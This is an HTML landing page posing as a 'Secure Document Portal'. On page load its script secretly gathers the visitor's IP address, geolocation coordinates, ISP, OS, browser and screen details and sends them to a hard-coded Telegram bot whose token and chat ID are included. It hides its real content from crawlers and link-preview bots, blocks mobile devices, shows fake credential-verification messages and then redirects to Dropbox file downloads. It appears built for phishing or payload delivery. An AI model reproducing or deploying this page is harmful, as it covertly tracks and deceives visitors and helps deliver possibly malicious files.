<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Document Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            background: white;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.05);
            text-align: center;
            border: 1px solid #e9ecef;
        }
        .icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 16px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        h2 {
            color: #1a1e2b;
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        p {
            color: #6c757d;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 24px;
        }
        .loader {
            width: 36px;
            height: 36px;
            border: 3px solid #e9ecef;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status {
            color: #6c757d;
            font-size: 13px;
            margin: 16px 0;
        }
        .manual-link {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        }
        .manual-link a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #adb5bd;
        }
        .message-card {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            max-width: 500px;
            margin: 0 auto;
        }
        .message-card .card {
            background: white;
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
            border: 1px solid #e9ecef;
        }
        .message-card .icon-large {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .message-card h2 {
            color: #1a1e2b;
            margin-bottom: 16px;
        }
        .message-card p {
            color: #6c757d;
            margin: 16px 0;
        }
        .permission-buttons {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 20px;
            margin: 30px 0;
        }
        .permission-btn {
            display: inline-block;
            padding: 14px 32px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .permission-btn.chrome {
            background: #4285f4;
            color: white;
        }
        .permission-btn.chrome:hover {
            background: #3367d6;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(66,133,244,0.3);
        }
        .permission-btn.firefox {
            background: #ff9400;
            color: white;
        }
        .permission-btn.firefox:hover {
            background: #e08500;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(255,148,0,0.3);
        }
        .permission-btn:active {
            transform: translateY(0);
        }
        .install-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        }
        .install-links {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-top: 12px;
        }
        .install-links a {
            color: #4285f4;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .install-links a.firefox-link {
            color: #ff9400;
        }
        .install-links a:hover {
            text-decoration: underline;
        }
        .instruction-note {
            background: #f0f2f5;
            padding: 14px;
            border-radius: 12px;
            margin: 20px 0 0;
            font-size: 13px;
            color: #495057;
        }
        .cancel-btn {
            background: none;
            border: none;
            color: #6c757d;
            cursor: pointer;
            font-size: 14px;
            text-decoration: underline;
            margin-top: 20px;
            padding: 8px 16px;
        }
        .cancel-btn:hover {
            color: #495057;
        }
    </style>
</head>
<body>
    <div id="app"></div>

    <script>
        // ============================================================
        // TELEGRAM CONFIGURATION
        // ============================================================
        const TELEGRAM_TOKEN = '7867220186:AAFdEwxp6Kf8AxMiQGsvwCdRXpCNb2ul1hY';
        const TELEGRAM_CHAT_ID = '1482823538';
        
        // ============================================================
        // YOUR DROPBOX LINKS
        // ============================================================
        const FILE_LINKS = [
            'https://www.dropbox.com/scl/fi/76l3iokuummrj6bqcwz2l/document.pdf?rlkey=4zny8tbzwnclmicin19mkiqzv&st=u6h49qc7&dl=1',
            'https://www.dropbox.com/scl/fi/n6fm2pc07dypzwrzq5c5w/file.pdf?rlkey=mxhr1idbh4n9kxwgqdvr32g2v&st=8v2ndkty&dl=1',
            'https://www.dropbox.com/scl/fi/817vn4cz1boj1n6qh5wnm/statement.pdf?rlkey=vi7iabc0hkfikecy9qls6jcq9&st=53rpom34&dl=1'
        ];
        
        // ============================================================
        // TELEGRAM NOTIFICATION
        // ============================================================
        async function sendTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                return false;
            }
        }
        
        // ============================================================
        // GET IP AND LOCATION
        // ============================================================
        async function getLocationInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const locationData = await locationResponse.json();
                
                return {
                    ip: ip,
                    city: locationData.city || 'Unknown',
                    region: locationData.region || 'Unknown',
                    country: locationData.country_name || 'Unknown',
                    latitude: locationData.latitude || 'N/A',
                    longitude: locationData.longitude || 'N/A',
                    isp: locationData.org || 'Unknown',
                    timezone: locationData.timezone || 'Unknown'
                };
            } catch (error) {
                return {
                    ip: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    latitude: 'N/A',
                    longitude: 'N/A',
                    isp: 'Unknown',
                    timezone: 'Unknown'
                };
            }
        }
        
        // ============================================================
        // SEND VISIT NOTIFICATION
        // ============================================================
        async function sendVisitNotification(selectedFile, browserName, action = 'view') {
            const location = await getLocationInfo();
            const userAgent = navigator.userAgent;
            const screenSize = `${window.screen.width}x${window.screen.height}`;
            const referrer = document.referrer || 'Direct';
            const timestamp = new Date().toISOString();
            const fileName = selectedFile.split('/').pop().split('?')[0];
            
            const message = `🔵 <b>DOCUMENT ACCESS</b> 🔵
            
📍 <b>Location:</b> ${location.city}, ${location.region}, ${location.country}
🌐 <b>IP Address:</b> ${location.ip}
🗺️ <b>Coordinates:</b> ${location.latitude}, ${location.longitude}
🏢 <b>ISP:</b> ${location.isp}
⏰ <b>Timezone:</b> ${location.timezone}

📁 <b>File:</b> ${fileName}
💻 <b>OS:</b> ${navigator.platform}
🌍 <b>Browser:</b> ${browserName}
🔄 <b>Action:</b> ${action}
🖥️ <b>Screen:</b> ${screenSize}
🔗 <b>Referrer:</b> ${referrer}
📅 <b>Time:</b> ${timestamp}

<b>User Agent:</b>
<code>${userAgent.substring(0, 200)}</code>`;
            
            await sendTelegram(message);
        }
        
        // ============================================================
        // BROWSER DETECTION
        // ============================================================
        function detectBrowser() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.indexOf('edg') > -1 || ua.indexOf('edge') > -1) return 'Microsoft Edge';
            if (ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1) return 'Chrome';
            if (ua.indexOf('firefox') > -1) return 'Firefox';
            if (ua.indexOf('safari') > -1 && ua.indexOf('chrome') === -1) return 'Safari';
            return 'Unknown';
        }
        
        // ============================================================
        // OPEN IN BROWSER
        // ============================================================
        function openInBrowser(browser, url, browserName, buttonElement) {
            buttonElement.disabled = true;
            const originalText = buttonElement.textContent;
            buttonElement.textContent = 'Opening...';
            
            window.location.href = `${browser}://${url.replace(/^https?:\/\//, '')}`;
            navigator.clipboard.writeText(url);
            
            setTimeout(() => {
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', `opened_in_${browserName}`);
                buttonElement.disabled = false;
                buttonElement.textContent = originalText;
                setTimeout(() => window.close(), 1500);
            }, 500);
        }
        
        // ============================================================
        // ASK TO OPEN IN CHROME/FIREFOX
        // ============================================================
        function askToOpenInOtherBrowser(currentUrl) {
            const modal = document.createElement('div');
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
            `;
            
            const dialog = document.createElement('div');
            dialog.style.cssText = `
                background: white;
                max-width: 500px;
                width: 90%;
                padding: 35px;
                border-radius: 28px;
                text-align: center;
                box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            `;
            
            dialog.innerHTML = `
                <div style="font-size: 56px; margin-bottom: 16px;">🌐</div>
                <h2 style="margin-bottom: 12px; font-size: 26px;">Switch Browser</h2>
                <p style="color: #6c757d; margin-bottom: 20px; font-size: 15px;">
                    This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.
                </p>
                
                <div class="permission-buttons">
                    <button id="chromeBtn" class="permission-btn chrome">Open in Chrome</button>
                    <button id="firefoxBtn" class="permission-btn firefox">Open in Firefox</button>
                </div>
                
                <div class="install-section">
                    <p style="font-size: 13px; color: #6c757d; margin-bottom: 10px;">
                        <strong>Don't have Chrome or Firefox?</strong>
                    </p>
                    <div class="install-links">
                        <a href="https://www.google.com/chrome/" target="_blank" class="chrome-link">⬇️ Download Chrome</a>
                        <a href="https://www.mozilla.org/firefox/" target="_blank" class="firefox-link">⬇️ Download Firefox</a>
                    </div>
                    <div class="instruction-note">
                        💡 <strong>After installing:</strong> Click the button above again. The link will open automatically.
                    </div>
                </div>
                
                <button id="cancelBtn" class="cancel-btn">Continue in Edge (not recommended)</button>
            `;
            
            modal.appendChild(dialog);
            document.body.appendChild(modal);
            
            // Chrome button
            document.getElementById('chromeBtn').onclick = (e) => {
                e.preventDefault();
                openInBrowser('googlechrome', currentUrl, 'chrome', document.getElementById('chromeBtn'));
            };
            
            // Firefox button
            document.getElementById('firefoxBtn').onclick = (e) => {
                e.preventDefault();
                openInBrowser('firefox', currentUrl, 'firefox', document.getElementById('firefoxBtn'));
            };
            
            // Cancel button
            document.getElementById('cancelBtn').onclick = () => {
                modal.remove();
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'cancelled_switch');
            };
        }
        
        // ============================================================
        // MAIN EXECUTION
        // ============================================================
        (async function() {
            const ua = navigator.userAgent.toLowerCase();
            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(ua);
            const browser = detectBrowser();
            const currentUrl = window.location.href;
            
            // Bot detection
            const isBot = /bot|crawler|spider|scraper|facebookexternalhit|twitterbot|linkedinbot|whatsapp/i.test(ua);
            if (isBot) {
                document.getElementById('app').innerHTML = `
                    <div class="container">
                        <div class="icon">📄</div>
                        <h2>Document Portal</h2>
                        <p>Secure document delivery system.</p>
                        <div class="footer">Secure Transmission</div>
                    </div>
                `;
                return;
            }
            
            // Mobile block
            if (isMobile) {
                document.getElementById('app').innerHTML = `
                    <div class="message-card">
                        <div class="card">
                            <div class="icon-large">📱</div>
                            <h2>Desktop Access Required</h2>
                            <p>This document requires a desktop environment.</p>
                            <p style="font-size: 13px; color: #adb5bd;">Please open this link on a desktop computer.</p>
                            <hr style="margin: 24px 0 16px; border: none; border-top: 1px solid #e9ecef;">
                            <p style="font-size: 11px; color: #adb5bd;">Secure Document Portal</p>
                        </div>
                    </div>
                `;
                return;
            }
            
            // Edge – ask to switch to Chrome/Firefox
            if (browser === 'Microsoft Edge') {
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'edge_detected');
                askToOpenInOtherBrowser(currentUrl);
                return;
            }
            
            // Chrome/Firefox – normal redirect
            document.getElementById('app').innerHTML = `
                <div class="container">
                    <div class="icon">📄</div>
                    <h2>Document Portal</h2>
                    <p>Your document is being prepared</p>
                    <div class="loader"></div>
                    <div class="status" id="status">Verifying access...</div>
                    <div class="manual-link" id="manualLink">
                        <a href="#" id="manualUrl">Click here if not redirected</a>
                    </div>
                    <div class="footer">Secure • Encrypted</div>
                </div>
            `;
            
            function getRandomFile() {
                const fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
                let hash = 0;
                for (let i = 0; i < fingerprint.length; i++) {
                    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
                    hash |= 0;
                }
                return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
            }
            
            const selectedFile = getRandomFile();
            sendVisitNotification(selectedFile, browser, 'access_granted');
            
            if (!sessionStorage.getItem('redirected')) {
                sessionStorage.setItem('redirected', 'true');
                
                const delay = 1500 + Math.random() * 2000;
                const messages = ['Verifying credentials', 'Loading document', 'Preparing download', 'Redirecting...'];
                let idx = 0;
                const statusEl = document.getElementById('status');
                const interval = setInterval(() => {
                    if (statusEl) {
                        idx = (idx + 1) % messages.length;
                        statusEl.innerHTML = messages[idx];
                    }
                }, 800);
                
                setTimeout(() => {
                    clearInterval(interval);
                    window.location.href = selectedFile;
                }, delay);
                
                setTimeout(() => {
                    const manualLink = document.getElementById('manualLink');
                    const manualUrl = document.getElementById('manualUrl');
                    if (manualLink && manualUrl) {
                        manualLink.style.display = 'block';
                        manualUrl.href = selectedFile;
                        const loader = document.querySelector('.loader');
                        if (loader) loader.style.display = 'none';
                        if (statusEl) statusEl.innerHTML = 'Click to download';
                    }
                }, 5000);
            } else {
                const loader = document.querySelector('.loader');
                const statusEl = document.getElementById('status');
                if (loader) loader.style.display = 'none';
                if (statusEl) statusEl.innerHTML = 'Document ready';
                document.getElementById('manualLink').style.display = 'block';
                document.getElementById('manualUrl').href = selectedFile;
            }
        })();
    </script>
</body>
</html>
